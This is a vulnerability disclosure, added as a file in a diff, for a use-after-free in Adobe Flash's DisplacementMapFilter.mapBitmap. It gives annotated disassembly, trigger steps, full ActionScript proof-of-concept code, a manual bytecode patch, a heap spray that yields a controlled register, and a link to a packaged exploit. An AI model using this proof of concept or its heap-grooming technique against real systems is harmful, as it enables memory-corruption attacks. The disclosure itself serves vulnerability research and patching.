@@ -1,0 +1,145 @@
+Source: https://code.google.com/p/google-security-research/issues/detail?id=358&can=1&q=label%3AProduct-Flash%20modified-after%3A2015%2F8%2F17&sort=id
+
+[Deadline tracking for https://code.google.com/p/chromium/issues/detail?id=457680]
+
+---
+VULNERABILITY DETAILS
+There is a use after free in Flash caused by an improper handling of BitmapData objects in the DisplacementMapFilter.mapBitmap property. 
+
+VERSION
+Chrome Version: 40.0.2214.111 stable, Flash 16.0.0.305
+Operating System: Win7 SP1 x64]
+
+The AS2 mapBitmap_as2.fla can be compiled with Flash CS5. Some bytes must be changed manually to trigger the issue (see below).
+Just put mapBitmap_as2.swf in a browsable directory and run the swf with Chrome. It should crash while dereferencing 0x41424344.
+
+
+Here are a few steps to trigger the issue:
+
+1) Create a BitmapData and store it somewhere, for example as a static member of a custom class.
+2) Create a second BitmapData and use it to create a DisplacementMapFilter. We don't care about this BitmapData, it is just needed to create the filter.
+3) Override the BitmapData constructor with a custom class. That class should put the first BitmapData on top of the AS2 stack when the constructor returns.
+4) Create an object o and change its valueOf method so that it points to a function that calls the DisplacementMapFilter.mapBitmap property.
+5) Use the first BitmapData and call getPixel32(o).
+
+What happens during step 5? Flash caches first the BitmapData in the stack before calling o.valueOf. At that moment the BitmapData isn't used elsewhere so its refcount equals 1. Flash enters then o.valueOf which leads to get the mapBitmap property. At that moment we hit the following lines, in sub_10193F2D:
+
+CPU Disasm
+Address   Hex dump          Command        
+6D2D3FBB    68 BE27C66D     PUSH OFFSET 6DC627BE
+6D2D3FC0    FF73 04         PUSH DWORD PTR DS:[EBX+4]
+6D2D3FC3    56              PUSH ESI
+6D2D3FC4    8B33            MOV ESI,DWORD PTR DS:[EBX]
+6D2D3FC6    E8 A572F8FF     CALL 6D25B270                 ; that function creates a new atom and calls the BitmapData constructor
+6D2D3FCB    84C0            TEST AL,AL
+6D2D3FCD    74 09           JE SHORT 6D2D3FD8
+6D2D3FCF    8B0B            MOV ECX,DWORD PTR DS:[EBX]
+6D2D3FD1    6A 01           PUSH 1  
+6D2D3FD3    E8 281A0100     CALL 6D2E5A00                 ; if the constructor is overriden by a custom class, the custom constructor is called here
+6D2D3FD8    8B75 08         MOV ESI,DWORD PTR SS:[EBP+8]
+6D2D3FDB    8B13            MOV EDX,DWORD PTR DS:[EBX]
+6D2D3FDD    56              PUSH ESI
+6D2D3FDE    E8 418EF6FF     CALL 6D23CE24                 ; then pop the new atom from the AS2 stack
+...
+6D2D4000    23F8            AND EDI,EAX
+6D2D4002    807F 35 1B      CMP BYTE PTR DS:[EDI+35],1B   ; and ensure this is indeed a BitmapData
+6D2D4006    74 0A           JE SHORT 6D2D4012
+...
+
+In the next lines Flash does two things. It destroys the BitmapData object associated to the BitmapData atom and replaces it with the one defined in the DisplacementMapFilter:
+
+6D2D4012    8B47 28         MOV EAX,DWORD PTR DS:[EDI+28]
+6D2D4015    83E0 FE         AND EAX,FFFFFFFE
+6D2D4018    8B40 18         MOV EAX,DWORD PTR DS:[EAX+18]  ; get the BitmapData object 
+6D2D401B    33C9            XOR ECX,ECX
+6D2D401D    51              PUSH ECX
+6D2D401E    E8 1DB2FEFF     CALL 6D2BF240                  ; call the BitmapData destructor
+6D2D4023    8B75 10         MOV ESI,DWORD PTR SS:[EBP+10]
+6D2D4026    8BC7            MOV EAX,EDI
+6D2D4028    E8 134AF6FF     CALL 6D238A40                  ; and associate the DisplacementMapFilter.mapBitmap object
+
+
+All of this works as long as the BitmapData object read from the AS2 stack is not in use somewhere. But since we can provide our own constructor, we can do anything with the AS2 stack, including having an in use BitmapData at the top of the stack when the constructor returns. This can be done by manipulating the AS2 byte code of the constructor for example. So if the returned BitmapData has a refcounter set to 1, Flash frees the object and we end up with a garbage reference in the stack which crashes the player in BitmapData.getPixel32.
+
+After compiling mapBitmap_as2.swf, I had to change the bytes at offset 0x90F in the (MyBitmapData constructor):
+52 17 96 02 00 04 03 26 to 17 17 17 17 17 17 17 17 (actionPOP)
+
+Hopefully if it works we should crash here with eax controlled:
+CPU Disasm
+Address   Hex dump          Command
+6D2BFA83    3B58 0C         CMP EBX,DWORD PTR DS:[EAX+0C]      //eax = 0x41424344
+6D2BFA86    7D 57           JGE SHORT 6D2BFADF
+6D2BFA88    85FF            TEST EDI,EDI
+6D2BFA8A    78 53           JS SHORT 6D2BFADF
+6D2BFA8C    3B78 08         CMP EDI,DWORD PTR DS:[EAX+8]
+6D2BFA8F    7D 4E           JGE SHORT 6D2BFADF
+6D2BFA91    8BC8            MOV ECX,EAX
+6D2BFA93    8B01            MOV EAX,DWORD PTR DS:[ECX]
+6D2BFA95    8B50 10         MOV EDX,DWORD PTR DS:[EAX+10]
+6D2BFA98    FFD2            CALL EDX
+
+I don't kwow if we can abuse ASLR with that. If we can do something without getting a virtual function dereferenced, it must be possible.
+
+
+***************************************************************************
+Content of MyBitmapData.as
+
+class MyBitmapData extends String
+{
+	static var mf;
+	function MyBitmapData()
+	{
+		super();
+        var a = MyBitmapData.mf
+        test(a,a,a,a,a,a,a,a)                         //that part should be deleted manually in the bytecode
+        trace(a)                                      //so that MyBitmapData.mf stays on top of the AS2 stack
+	}
+	public function test(a,b,c,d,e,f,g,h) {
+    
+    }
+	static function setBitmapData(myfilter)
+	{
+		mf = myfilter;
+	}
+}
+
+***************************************************************************
+Content of mapBitmap_as2.fla
+
+import flash.filters.DisplacementMapFilter;
+import flash.display.BitmapData;
+
+var bd:BitmapData = new BitmapData(10,10)
+MyBitmapData.setBitmapData(bd)
+var bd2:BitmapData = new BitmapData(10,10)
+var dmf:DisplacementMapFilter = new DisplacementMapFilter(bd2,new flash.geom.Point(1,2),1,2,3,4)
+
+newConstr = MyBitmapData
+flash.display.BitmapData = newConstr
+
+function f() {
+	var a = dmf.mapBitmap;
+}
+var a:Array = new Array()
+var b:Array = new Array()
+for (var i = 0; i<0xC8/4;i++) {
+	b[i] = 0x41424344
+}
+
+var o = new Object()
+o.valueOf = function () {
+	f()
+	for (var i = 0; i<0x10;i++) {
+		var tf:TextFormat = new TextFormat()
+		tf.tabStops = b
+		a[i] = tf
+	}
+	return 4
+}
+
+bd.getPixel32(o,4)
+---
+
+Proof of Concept:
+https://github.com/offensive-security/exploit-database-bin-sploits/raw/master/sploits/37853.zip
+
